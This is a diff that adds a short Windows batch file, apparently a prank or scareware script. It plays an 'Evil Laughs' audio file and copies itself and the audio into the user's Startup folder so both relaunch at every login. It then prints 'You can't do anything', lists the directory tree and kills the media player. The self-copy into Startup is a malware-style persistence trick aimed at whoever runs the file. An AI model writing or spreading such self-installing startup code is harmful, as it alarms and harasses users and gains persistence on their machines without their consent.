@@ -1,0 +1,14 @@
+ECHO OFF
+cls
+setlocal enabledelayedexpansion
+set /A "c=1"
+set /a "d=1"
+start "" "%cd%\Evil_Laughs-Mike_Koenig-933903605.mp3"
+copy "%cd%\Batch.bat"  "C:\Users\wipro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
+copy "%cd%\Evil_Laughs-Mike_Koenig-933903605.mp3"  "C:\Users\wipro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
+echo You can't do anything
+color 0a
+@tree %cd% /f /a
+ping 127.0.0.1 -n 12 >NUL
+taskkill /IM wmplayer.exe
+pause
